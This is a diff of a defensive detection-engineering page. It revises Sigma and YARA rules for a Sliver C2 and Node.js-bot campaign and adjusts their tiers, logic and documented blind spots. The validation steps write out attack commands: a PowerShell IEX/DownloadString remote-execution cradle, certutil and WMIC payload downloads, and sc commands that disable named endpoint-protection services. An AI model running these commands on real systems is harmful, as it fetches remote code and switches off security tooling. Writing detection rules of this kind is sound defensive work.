@@ -21,7 +21,7 @@ hide: true
 | Rule Type | Detection | Hunting | MITRE Techniques Covered | Atomics → feed |
 |---|---|---|---|---|
 | YARA | 2 | 2 | T1071.001, T1102.001, T1547.001 | 0 (already in IOC feed) |
-| Sigma | 7 | 5 | T1053.005, T1003.001, T1003.002, T1003.004, T1112, T1021.001, T1548.002, T1098, T1136.002, T1547.001, T1036.005, T1105, T1685, T1059.007, T1620, T1027 | 0 (already in IOC feed) |
+| Sigma | 6 | 6 | T1059.001, T1053.005, T1003.001, T1003.002, T1003.004, T1112, T1021.001, T1548.002, T1098, T1136.002, T1547.001, T1036.005, T1105, T1685, T1059.007, T1620, T1027 | 0 (already in IOC feed) |
 | Suricata | 2 | 0 | T1071.001 | 0 (already in IOC feed) |
 
 > **Detection vs Hunting:** *Detection rules* are high-fidelity and evasion-resilient, safe to alert on. *Hunting rules* are broader, for scoping and threat-hunting; expect to review the hits.
@@ -50,7 +50,7 @@ This campaign runs two hard-linked strands: a **Sliver** beacon plus supporting 
 **Confidence:** HIGH
 **False Positives:** None known for the `/tmp/` operator source paths, which are not standard Go toolchain output, except that `/tmp/payloads/` is a generic directory name that is not campaign-exclusive, so two generic `/tmp/` strings from unrelated tooling can satisfy the condition. The `Chrome/108.0.6602.492` string alone is a build-profile constant that could theoretically be copy-pasted into an unrelated tool, so the rule requires two independent strings before it fires.
 **Blind Spots:** Misses any build that holds fewer than two of the six strings: changing the source-directory convention so that only the User-Agent remains already misses, and so does changing the User-Agent while leaving only one path. Does not fire on the Sliver beacon's own shellcode blob (`slv_beacon_sc.bin`), which yielded nothing to static string analysis.
-**Validation:** A build matches only if it holds two of the six strings. The report describes small reverse shells with individual `/tmp/` paths and a separate beacon with the User-Agent, so which of the operator's named builds (e.g. `da_shell_39.exe`, `ws37.exe`, `svchost_update.exe`) hold two anchors is not established, and sample recall is NOT CHECKED. A benign case that must NOT fire: a clean Windows PE, or a legitimately compiled Go binary that happens to embed a real, internally consistent Chrome User-Agent string.
+**Validation:** A build matches only if it holds two of the six strings. In the published report, small reverse shells carry individual `/tmp/` paths and a separate beacon carries the User-Agent, so which of the operator's named builds (e.g. `da_shell_39.exe`, `ws37.exe`, `svchost_update.exe`) hold two anchors is not established, and sample recall is NOT CHECKED. A benign case that must NOT fire: a clean Windows PE, or a legitimately compiled Go binary that happens to embed a real, internally consistent Chrome User-Agent string.
 **Deployment:** Endpoint file scan, static triage of samples pulled from staging infrastructure.
 
 ```yara
@@ -220,54 +220,6 @@ rule Operator_AD_Deployment_Script_Markers_TheGentlemen {
 
 **Sliver**
 
-#### Weekly Scheduled Task Re-Pulling Attack Chain Via IEX WebClient DownloadString As SYSTEM
-
-**Tier:** Detection
-**Robustness:** 2
-**ATT&CK Coverage:** T1053.005 (Scheduled Task)
-**Confidence:** HIGH
-**False Positives:** Legitimate IT automation that intentionally re-pulls a PowerShell script from an internal or vendor URL on a schedule. Distinguishable in practice by the destination not being an internal admin's expected update source.
-**Blind Spots:** Misses a rebuild that swaps `IEX`/`DownloadString` for a different in-memory execution primitive (e.g., `Invoke-Expression` aliasing, `.Net WebClient` replaced by `Invoke-RestMethod`), or a task that stages the download separately from execution.
-**Validation:** Trigger by creating a scheduled task whose action runs `powershell -c "iex((New-Object Net.WebClient).DownloadString('http://...'))"` under the SYSTEM context. A benign case that must NOT fire: a scheduled PowerShell task that reads a local script file rather than downloading and immediately executing remote content.
-**Deployment:** Endpoint EDR / Sysmon-fed SIEM.
-
-```yaml
-title: Scheduled PowerShell Re-Pull Of Remote Script Via IEX WebClient DownloadString
-id: 2875053e-f1d1-429d-bf6a-49ee74d7c6dd
-status: experimental
-description: >-
-  Detects a PowerShell process launched with a command line that downloads and immediately
-  executes a remote script via IEX and Net.WebClient.DownloadString, the pattern used by a
-  weekly SYSTEM scheduled task to re-pull the full attack chain fresh from C2 rather than
-  running a static payload.
-references:
-    - https://the-hunters-ledger.com/hunting-detections/sliver-c2-windows-postex-staging-193-233-202-17-detections/
-author: The Hunters Ledger
-date: '2026-09-06'
-tags:
-    - attack.execution
-    - attack.t1059.001
-    - attack.persistence
-    - attack.privilege-escalation
-    - attack.t1053.005
-    - stp.3
-logsource:
-    category: process_creation
-    product: windows
-    definition: 'Requires process creation logging that populates CommandLine, for example Sysmon EID 1 or Security EID 4688 with command line auditing enabled.'
-detection:
-    selection_image:
-        Image|endswith: '\powershell.exe'
-    selection_cmd:
-        CommandLine|contains|all:
-            - 'IEX'
-            - 'DownloadString'
-    condition: selection_image and selection_cmd
-falsepositives:
-    - Internal automation tooling that intentionally downloads and executes a remote update script on a schedule
-level: high
-```
-
 #### Registry Hive Save Of SAM, SYSTEM Or SECURITY To ProgramData
 
 **Tier:** Detection
@@ -317,7 +269,7 @@ falsepositives:
 level: high
 ```
 
-#### Rapid Addition Of An Account To The Domain Admins Group
+#### Account Added To The Domain Admins Group
 
 **Tier:** Detection
 **Robustness:** 2
@@ -325,7 +277,7 @@ level: high
 **Confidence:** HIGH
 **False Positives:** Legitimate, change-controlled promotion of an account to Domain Admins by IT staff, which is infrequent in a well-run estate and usually distinguishable by the actor and timing against a change ticket.
 **Blind Spots:** Misses privilege escalation via nested group membership (adding an account to a group that is itself a member of Domain Admins) rather than direct addition.
-**Validation:** Trigger by adding any account to the Domain Admins security group. A benign case that must NOT fire: routine, pre-approved administrative onboarding, which this rule will still flag for review by design (Detection tier, not silent).
+**Validation:** Trigger by adding any account to the Domain Admins security group: must fire. Both authorized and unauthorized direct additions match, because the selection has no actor, caller or change-ticket exclusion, so a pre-approved onboarding addition also fires and is meant to be checked against change records (Detection tier, not silent). A benign case that must NOT fire: adding an account to any group other than Domain Admins, or a membership event that is not a 4728 addition.
 **Deployment:** Domain controller Security event log, forwarded to SIEM.
 
 ```yaml
@@ -362,46 +314,55 @@ level: high
 
 **EtherRAT-class Node.js bot**
 
-#### EtherRAT Bot Run Key Launching node.exe Headless With A .bak Argument
+#### Run Key Value Starting With A Headless Conhost Launcher And Containing node.exe And A .bak Path
 
 **Tier:** Detection
-**Robustness:** 3
+**Robustness:** 2
 **ATT&CK Coverage:** T1547.001 (Registry Run Keys / Startup Folder)
 **Confidence:** HIGH
-**False Positives:** None known. `conhost --headless` invoking `node.exe` against a `.bak`-extension argument from a Run key is not a pattern any legitimate Node.js installer or application uses.
-**Blind Spots:** Misses a rebuild that renames the launcher prefix away from `conhost --headless` or changes the payload file extension away from `.bak`.
-**Validation:** Trigger by creating an `HKCU\...\Run` value whose data begins `conhost --headless` and invokes `node.exe` against a `.bak` file. A benign case that must NOT fire: a legitimate Node.js application's own startup registration, which does not use this launcher prefix or file extension.
+**False Positives:** None known. A Run value whose data begins with the `conhost --headless` launcher token and also contains `node.exe` and a token ending in `.bak` is not a pattern any legitimate Node.js installer or application is known to use.
+**Blind Spots:** Robustness is 2 because this is an implementation combination: a rebuild that renames the launcher prefix away from `conhost --headless` (including a full path to `conhost.exe` or a leading quote, which break the start-of-data test) or changes the payload file extension away from `.bak` evades it. The prefix test requires the token `conhost --headless` followed by a space, and the extension test requires `.bak` to be followed by a space, a double or single quote, or to end the data, so a name like `script.bakery` does not match; `node.exe` is tested as a substring anywhere in the data (so `mynode.exe` also matches), and `.bak` is not bound to being node.exe's argument. It matches the `\CurrentVersion\Run\` key in any hive, per-user or machine-wide.
+**Validation:** Trigger by creating a Run value (for example under `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`) whose data begins `conhost --headless ` and contains both `node.exe` and a quoted `.bak` argument, as in the report's example: must fire. Benign cases that must NOT fire: a legitimate Node.js application's own startup registration, which does not use this launcher prefix or file extension; a value that contains `conhost --headless` only after other text; `conhost --headlessXYZ ... node.exe script.bakery`.
 **Deployment:** Endpoint EDR / Sysmon-fed SIEM with registry value auditing enabled.
 
 ```yaml
-title: Run Key Value Launching Headless Node.js Against A .bak File
+title: Run Key Value Starting With A Headless Conhost Launcher And Containing node.exe And A .bak Path
 id: 981da035-041b-434b-9db6-141c3c778534
 status: experimental
 description: >-
-  Detects a Run key registry value whose data begins conhost --headless and invokes
-  node.exe with a .bak-extension argument, the persistence mechanism used by an
-  EtherRAT-class Node.js bot that resolves its C2 address from an Ethereum smart contract.
+  Detects a Run key registry value whose data begins with the token conhost --headless
+  (followed by a space), contains node.exe, and contains a token ending in .bak (followed by a
+  space or a quote, or ending the data), the persistence mechanism used by an EtherRAT-class Node.js bot
+  that resolves its C2 address from an Ethereum smart contract.
 references:
     - https://the-hunters-ledger.com/hunting-detections/sliver-c2-windows-postex-staging-193-233-202-17-detections/
 author: The Hunters Ledger
 date: '2026-09-06'
+modified: '2026-10-11'
 tags:
     - attack.persistence
     - attack.privilege-escalation
     - attack.t1547.001
+    - stp.3
 logsource:
     category: registry_set
     product: windows
-    definition: 'Requires Sysmon Event ID 13 (RegistryEvent SetValue) with value auditing enabled for HKCU Run keys, or Security Event ID 4657.'
+    definition: 'Requires Sysmon Event ID 13 (RegistryEvent SetValue) with value auditing enabled for the Run keys, or Security Event ID 4657.'
 detection:
-    selection:
+    selection_key:
         TargetObject|contains: '\CurrentVersion\Run\'
-        Details|contains|all:
-            - 'conhost --headless'
-            - 'node.exe'
-    filter_extension:
-        Details|contains: '.bak'
-    condition: selection and filter_extension
+    selection_start:
+        Details|startswith: 'conhost --headless '
+    selection_node:
+        Details|contains: 'node.exe'
+    selection_bak_mid:
+        Details|contains:
+            - '.bak '
+            - '.bak"'
+            - ".bak'"
+    selection_bak_end:
+        Details|endswith: '.bak'
+    condition: selection_key and selection_start and selection_node and 1 of selection_bak_*
 falsepositives:
     - Unknown. No legitimate Node.js packaging pattern matches this launcher-plus-extension combination.
 level: high
@@ -502,29 +463,32 @@ level: high
 
 **Campaign-Level**
 
-#### certutil Or WMIC-Invoked certutil Downloading From A Bare IP High Port
+#### Certutil URLCache Download Or WMIC Node-Targeted Certutil Download
 
 **Tier:** Detection
 **Robustness:** 2
 **ATT&CK Coverage:** T1105 (Ingress Tool Transfer), T1570 (Lateral Tool Transfer)
 **Confidence:** HIGH
-**False Positives:** None known for the `-urlcache -split -f` combination, which has no common legitimate use outside certificate-cache management (its stated purpose) and is a well-documented LOLBin abuse pattern.
-**Blind Spots:** Misses ingress tool transfer via any binary other than certutil (PowerShell's own `Invoke-WebRequest`/`Invoke-RestMethod`, `bitsadmin`, or a custom downloader).
-**Validation:** Trigger by running `certutil -urlcache -split -f http://<ip>:<port>/file.exe out.exe`, either directly or via `wmic /node:<host> process call create` invoking the same command remotely. A benign case that must NOT fire: `certutil` used for its ordinary certificate-cache functions without `-urlcache -split -f`.
+**False Positives:** None known for the direct branch (`-urlcache -split -f`), which has no common legitimate use outside certificate-cache management (its stated purpose) and is a well-documented LOLBin abuse pattern. The WMIC branch requires a `/node:` argument, `process call create`, `certutil`, `-urlcache` and `-split` in the `wmic` command line, but not `-f`. Certificate-cache maintenance run through wmic, such as `certutil -urlcache * delete`, carries `-urlcache` but not `-split` and does not match. `/node:` names a target host and can name the local machine, so the branch is a node-targeted command-text match, not proof that the command ran on another host.
+**Blind Spots:** Misses ingress tool transfer via any binary other than certutil (PowerShell's own `Invoke-WebRequest`/`Invoke-RestMethod`, `bitsadmin`, or a custom downloader). Neither branch tests the download destination, address or port, so a download from an internal host matches as readily as one from an external address. A local `wmic process call create` with no `/node:` argument is not matched by the WMIC branch, and `-split` is required there, so a WMIC-launched `certutil -urlcache -f` without `-split` is missed.
+**Validation:** Trigger by running `certutil -urlcache -split -f http://<ip>:<port>/file.exe out.exe`, either directly or via `wmic /node:<host> process call create` invoking the same command remotely. A benign case that must NOT fire: `certutil` used for its ordinary certificate-cache functions without `-urlcache -split -f`, and a `wmic /node:<host> process call create` that launches certutil without `-urlcache -split` (for example `certutil -verify` or `certutil -urlcache * delete`).
 **Deployment:** Endpoint EDR / Sysmon-fed SIEM.
 
 ```yaml
-title: Certutil URLCache Download Or Remote WMIC-Invoked Certutil Download
+title: Certutil URLCache Download Or WMIC Node-Targeted Certutil Download
 id: 934c780a-ed74-45d9-bbe8-c5540ed96f55
 status: experimental
 description: >-
   Detects certutil invoked with -urlcache -split -f to fetch a remote file, either directly
-  or via a remote wmic process-call-create, the LOLBin ingress-tool-transfer pattern used
-  to stage payloads onto internal hosts from the operator's staging ports.
+  or via wmic process-call-create with a /node: argument that launches certutil with
+  -urlcache and -split, the LOLBin ingress-tool-transfer pattern used to stage payloads onto
+  internal hosts. /node: names a target and can name the local machine, so the wmic branch
+  does not prove a remote host. The download address and port are not tested.
 references:
     - https://the-hunters-ledger.com/hunting-detections/sliver-c2-windows-postex-staging-193-233-202-17-detections/
 author: The Hunters Ledger
 date: '2026-09-06'
+modified: '2026-10-11'
 tags:
     - attack.command-and-control
     - attack.t1105
@@ -545,8 +509,11 @@ detection:
     selection_remote:
         Image|endswith: '\WMIC.exe'
         CommandLine|contains|all:
+            - '/node:'
             - 'process call create'
             - 'certutil'
+            - '-urlcache'
+            - '-split'
     condition: selection_direct or selection_remote
 falsepositives:
     - Unlikely. certutil -urlcache -split -f has no common legitimate administrative use outside certificate-cache management, which does not use this flag combination.
@@ -554,6 +521,62 @@ level: high
 ```
 
 ### Hunting Rules
+
+**Sliver**
+
+#### PowerShell Command Line Containing IEX And DownloadString
+
+**Tier:** Hunting
+**Robustness:** 1
+**ATT&CK Coverage:** T1059.001 (PowerShell), T1053.005 (Scheduled Task)
+**ATT&CK Note:** T1053.005 is the persistence mechanism the campaign wraps this cradle in (a weekly SYSTEM task). The selection tests only the PowerShell command line, so a hit is a text-pattern lead for the download-and-execute cradle, not proof of one and not evidence of a scheduled task; review the command content before treating it as the cradle.
+**Confidence:** MODERATE
+**Rationale:** Re-tiered from Detection to Hunting, and `level` lowered from `high` to `medium`. The selection is `powershell.exe` plus the two substrings `IEX` and `DownloadString` in the command line. It does not test a Task Scheduler parent, the SYSTEM account, `Net.WebClient` or the download URL, so it matches the two strings wherever they appear, in a real cradle, in an interactive session, an installer or a legitimate automation script as readily as in the campaign's weekly SYSTEM task, and the false-positive line below concedes that population. The two substrings are ordinary primitives of a very common PowerShell download cradle, which is Robustness 1 (`stp.2`).
+**False Positives:** Legitimate IT automation, installers and bootstrap scripts that download and execute a script with the same cradle, whether interactively, from a scheduled task or from a management platform. The rule cannot separate a SYSTEM scheduled task from an interactive or installer run. Distinguishable in practice by the destination not being an expected update source.
+**Blind Spots:** Misses a rebuild that swaps `IEX`/`DownloadString` for a different in-memory execution primitive (e.g., `Invoke-Expression` aliasing, `.Net WebClient` replaced by `Invoke-RestMethod`), or a task that stages the download separately from execution. It does not see a command line that PowerShell reads from a script file or an encoded command.
+**Validation:** Trigger by running `powershell -c "iex((New-Object Net.WebClient).DownloadString('http://...'))"` from any context; the campaign runs it from a weekly SYSTEM scheduled task, but the rule does not require that context, so an interactive run fires as well. A benign case that must NOT fire: a PowerShell command line that contains neither `IEX` nor `DownloadString`, for example a scheduled task that reads a local script file rather than downloading and executing remote content. A command line that only quotes both strings (for example `-c "Write-Output 'IEX DownloadString'"`) fires without any download or execution, which is why a hit needs content review.
+**Deployment:** Endpoint EDR / Sysmon-fed SIEM. Hunting lead for scoping; check the parent process, the account and the destination before escalating.
+
+```yaml
+title: PowerShell Command Line Containing IEX And DownloadString
+id: 2875053e-f1d1-429d-bf6a-49ee74d7c6dd
+status: experimental
+description: >-
+  Detects a powershell.exe process whose command line contains both IEX and DownloadString,
+  the text of the download-and-execute cradle that this campaign's weekly SYSTEM scheduled task
+  uses to re-pull the full attack chain fresh from C2 rather than running a static payload. The
+  selection tests no scheduled-task parent, no SYSTEM account, no Net.WebClient and no
+  download URL, and it does not parse that anything is downloaded or executed, so it matches
+  the two strings wherever they appear, including legitimate installers and automation and a
+  command that only quotes them, and is a hunting lead rather than an alert.
+references:
+    - https://the-hunters-ledger.com/hunting-detections/sliver-c2-windows-postex-staging-193-233-202-17-detections/
+author: The Hunters Ledger
+date: '2026-09-06'
+modified: '2026-10-11'
+tags:
+    - attack.execution
+    - attack.t1059.001
+    - attack.persistence
+    - attack.privilege-escalation
+    - attack.t1053.005
+    - stp.2
+logsource:
+    category: process_creation
+    product: windows
+    definition: 'Requires process creation logging that populates CommandLine, for example Sysmon EID 1 or Security EID 4688 with command line auditing enabled.'
+detection:
+    selection_image:
+        Image|endswith: '\powershell.exe'
+    selection_cmd:
+        CommandLine|contains|all:
+            - 'IEX'
+            - 'DownloadString'
+    condition: selection_image and selection_cmd
+falsepositives:
+    - Internal automation tooling, installers and bootstrap scripts that intentionally download and execute a remote script with the same cradle
+level: medium
+```
 
 **Operator scripts and deployment**
 
@@ -621,70 +644,88 @@ falsepositives:
 level: medium
 ```
 
-#### Multiple Endpoint Protection Services Stopped In A Short Window
+#### Named Endpoint Protection Service Start Type Set To Disabled
 
 **Tier:** Hunting
-**Robustness:** 2
+**Robustness:** 1
 **ATT&CK Coverage:** T1685 (Disable or Modify Tools)
 **ATT&CK Note:** ATT&CK v19.2 revoked and restructured T1562 (Impair Defenses): T1562.001 was promoted to this top-level technique under a new Defense Impairment tactic rather than staying a Defense Evasion sub-technique, which is why this rule tags `attack.defense-impairment` and `attack.t1685` below, not the retired ID.
 **Confidence:** MODERATE
-**False Positives:** Legitimate endpoint-product uninstall, upgrade, or maintenance windows stop and briefly disable these same services; a single stopped service is common during patching. Tiered Hunting because a per-event Sigma selection cannot see the burst-of-eight pattern that makes this campaign's version distinctive; the true signal is several of these stopping together within minutes.
-**Blind Spots:** Misses a different AV/EDR product's service names entirely, and misses the burst timing this rule cannot correlate on its own.
-**Validation:** Trigger by stopping one of the listed services outside a known maintenance window. A benign case that must NOT fire: a scheduled, change-controlled endpoint-agent upgrade.
-**Deployment:** Endpoint EDR / Windows System event log forwarded to SIEM. Analyst should check for multiple hits on the same host within a short window before escalating.
+**Rationale:** Rewritten 2026-10-11. The earlier version selected every Service Control Manager event 7036 or 7040 with no service name and no state, so it matched every service start, stop and start-type change on every host and could not carry the "set of endpoint-protection service names" or "listed services" its text claimed. This version keys on the eight short service names that the campaign script `task_39.ps1` stops and disables (`ekrn`, `EraAgentSvc`, `EhttpSrv`, `EESvc`, `eguiSvc`, `epfw`, `epfwwfp`, `eamonm`, from the analysis notes; the product they belong to is not named here), and on the registry write that makes the disabled state persistent: the service's `Start` value set to 4 under `HKLM\System\<ControlSet>\Services\<name>`. It reads the registry because the Service Control Manager events report a service's display name, which the analysis notes do not record, while the registry key is named by the short service name the script used. It does not cover the stop half of the script: a service stopped but not disabled is not matched. Eight such writes within minutes is the campaign pattern; the per-event rule cannot count them, so one hit is a lead and several on one host in a short window is the signal.
+**False Positives:** The product's own installer, upgrade or uninstall setting one of these services to disabled, and an administrator deliberately disabling the product's services. Each write is individually ordinary during maintenance; only several of the eight together on one host within minutes resemble the campaign, and this rule does not count them.
+**Blind Spots:** Misses a different AV/EDR product's service names entirely, a stop without a disable, and a start-type change that Sysmon does not log (no registry monitoring of the Services hive). It does not count or time the burst.
+**Validation:** On a test host, create a service named one of the eight (for example `sc create ekrn binPath= C:\Windows\System32\cmd.exe`) and run `sc config ekrn start= disabled`, which must match once Sysmon logs the `Start` write. Setting the `Start` value of any other service to 4, or setting a listed service's `Start` to any value other than 4, must NOT fire. No live Sysmon event was replayed (NOT CHECKED); the decimal form of the value is accepted for the Elastic pipeline per the registry value rendering note under "RDP, UAC Or Token-Filter Registry Value Weakened".
+**Deployment:** Sysmon-fed SIEM with Event ID 13 registry monitoring that covers `HKLM\System\CurrentControlSet\Services`. Analyst should check for several of the eight names on the same host within a short window before escalating.
 
 ```yaml
-title: Endpoint Protection Service Stopped Or Disabled
+title: Named Endpoint Protection Service Start Type Set To Disabled
 id: 657adc6d-37b1-481d-8ff5-c13278c9c359
 status: experimental
 description: >-
-  Detects a Windows service-control-manager event stopping or disabling one of a set of
-  endpoint-protection service names. Individually common during legitimate maintenance;
-  several such events on one host within a short window is the actual campaign signature
-  and needs analyst correlation this single-event rule cannot perform.
+  Detects the Start value of one of eight named endpoint-protection services being set to 4
+  (disabled) under HKLM\System\<ControlSet>\Services, the service names that this campaign's
+  task_39.ps1 stops and disables. Individually common during legitimate maintenance; several
+  of the eight on one host within a short window is the actual campaign signature and needs
+  analyst correlation this single-event rule cannot perform.
 references:
     - https://the-hunters-ledger.com/hunting-detections/sliver-c2-windows-postex-staging-193-233-202-17-detections/
 author: The Hunters Ledger
 date: '2026-09-06'
+modified: '2026-10-11'
 tags:
     - attack.defense-impairment
     - attack.t1685
+    - stp.2
 logsource:
+    category: registry_set
     product: windows
-    service: system
-    definition: 'Requires the Windows System event log (Service Control Manager source), EventID 7036 (service entered stopped state) or 7040 (service start type changed).'
+    definition: 'Requires Sysmon Event ID 13 (RegistryEvent SetValue) with registry monitoring that covers HKLM\System\CurrentControlSet\Services. The rule reads the Sysmon fields TargetObject and Details (DWORD rendered as DWORD (0x00000004)); other registry sources such as Security Event ID 4657 name their fields differently and this page declares no mapping for them.'
 detection:
-    selection:
-        EventID:
-            - 7036
-            - 7040
-        Provider_Name: 'Service Control Manager'
-    condition: selection
+    selection_service:
+        TargetObject|startswith: 'HKLM\System\'
+        TargetObject|endswith:
+            - '\Services\ekrn\Start'
+            - '\Services\EraAgentSvc\Start'
+            - '\Services\EhttpSrv\Start'
+            - '\Services\EESvc\Start'
+            - '\Services\eguiSvc\Start'
+            - '\Services\epfw\Start'
+            - '\Services\epfwwfp\Start'
+            - '\Services\eamonm\Start'
+    selection_disabled:
+        Details:
+            - 'DWORD (0x00000004)'
+            - 4
+    condition: selection_service and selection_disabled
 falsepositives:
-    - Scheduled, change-controlled endpoint-agent maintenance, upgrade, or uninstall
+    - The endpoint product's own installer, upgrade or uninstall setting its services to disabled
+    - An administrator deliberately disabling the product's services during maintenance
 level: medium
 ```
 
-#### Node.js Runtime Fetched And Extracted On A Host With No Development Toolchain
+#### Curl Fetch Of A Node.js Zip Or tar.exe Command Line Under LOCALAPPDATA
 
 **Tier:** Hunting
 **Robustness:** 1
 **ATT&CK Coverage:** T1105 (Ingress Tool Transfer)
 **Confidence:** MODERATE
-**False Positives:** A developer's workstation or a build server legitimately fetching Node.js this same way is a real and common pattern; this rule cannot itself tell a developer host from a victim workstation, which is why it is Hunting rather than Detection.
-**Blind Spots:** Misses delivery of the Node.js runtime by any other mechanism (a bundled installer, a different package manager).
-**Validation:** Trigger by running `curl.exe` against `nodejs.org/dist/*.zip` followed by `tar.exe` extraction into `%LOCALAPPDATA%`. A benign case that must NOT fire in practice on a known developer host, though the rule itself does not distinguish.
+**False Positives:** A developer's workstation or a build server legitimately fetching Node.js this same way is a real and common pattern; this rule cannot itself tell a developer host from a victim workstation, which is why it is Hunting rather than Detection. The tar branch matches any `tar.exe` whose command line contains `\AppData\Local\`, whatever it extracts, because it carries no reference to Node.js.
+**Blind Spots:** Misses delivery of the Node.js runtime by any other mechanism (a bundled installer, a different package manager). The two branches are ORed and are not correlated: neither the order, the same host, a time window nor the presence or absence of a development toolchain is tested.
+**Validation:** Trigger by running `curl.exe` against `nodejs.org/dist/*.zip`, or `tar.exe` with a command line containing the expanded `\AppData\Local\` path (the rule tests the command line as logged after environment expansion, so a literal `%LOCALAPPDATA%` in the logged text does not match); either one alone fires, whether or not the other ran. The curl branch tests the two substrings `nodejs.org/dist` and `.zip` anywhere in the command line, not the URL host, so `curl.exe https://example.org/nodejs.org/dist/a.zip` fires as well. There is no benign negative in the rule: a developer host doing either is matched, and the rule itself does not distinguish.
 **Deployment:** Endpoint EDR / Sysmon-fed SIEM. Analyst should check whether the host has any other legitimate development purpose before escalating.
 
 ```yaml
-title: Curl Download Of Node.js Runtime Followed By Tar Extraction Into LOCALAPPDATA
+title: Curl Fetch Of A Node.js Zip Or tar.exe Command Line Under LOCALAPPDATA
 id: 32c19bc3-e8a6-430c-bb8b-b75943b93488
 status: experimental
 description: >-
-  Detects curl.exe fetching a Node.js distribution archive from nodejs.org followed by
-  tar.exe extracting it into %LOCALAPPDATA%, the bring-your-own-runtime bootstrap this
-  campaign's Node.js bot uses to obtain a signed, legitimate node.exe on a host with no
-  development toolchain.
+  Detects either of two independent events: curl.exe whose command line contains both
+  nodejs.org/dist and .zip (the substrings are not bound to the URL host), or tar.exe run
+  with a command line containing \AppData\Local\. Together
+  they are the bring-your-own-runtime bootstrap this campaign's Node.js bot uses to obtain a
+  signed, legitimate node.exe, but the two selections are ORed: no order, same-host or time
+  relationship is tested, the tar branch has no reference to Node.js, and nothing tests
+  whether the host has a development toolchain.
 references:
     - https://the-hunters-ledger.com/hunting-detections/sliver-c2-windows-postex-staging-193-233-202-17-detections/
 author: The Hunters Ledger
@@ -711,7 +752,7 @@ falsepositives:
 level: low
 ```
 
-#### Reflective .NET Assembly Load From A Base64-Encoded PowerShell String
+#### PowerShell Script Block Containing Reflection.Assembly Load And FromBase64String
 
 **Tier:** Hunting
 **Robustness:** 1
@@ -723,14 +764,16 @@ level: low
 **Deployment:** PowerShell Script Block Logging (Event ID 4104) forwarded to SIEM.
 
 ```yaml
-title: PowerShell Reflective Assembly Load From Base64-Decoded String
+title: PowerShell Script Block Containing Reflection.Assembly Load And FromBase64String
 id: 5024b26b-169d-4ef8-8016-ca502a557d1b
 status: experimental
 description: >-
-  Detects a PowerShell script block combining Reflection.Assembly Load with a
-  Base64-decoded byte array, a common reflective in-memory execution pattern this
-  campaign uses for shellcode injection staging. Broadly used by legitimate tooling as
-  well, so this is a scoping signal rather than a high-confidence alert.
+  Detects a PowerShell script block that contains both [System.Reflection.Assembly]::Load(
+  and FromBase64String, the combination of a reflective in-memory load with a Base64-decoded
+  byte array that this campaign uses for shellcode injection staging. The two strings are
+  tested independently within the script block; the rule does not test that the decoded
+  bytes are the argument to Load. Broadly used by legitimate tooling as well, so this is a
+  scoping signal rather than a high-confidence alert.
 references:
     - https://the-hunters-ledger.com/hunting-detections/sliver-c2-windows-postex-staging-193-233-202-17-detections/
 author: The Hunters Ledger
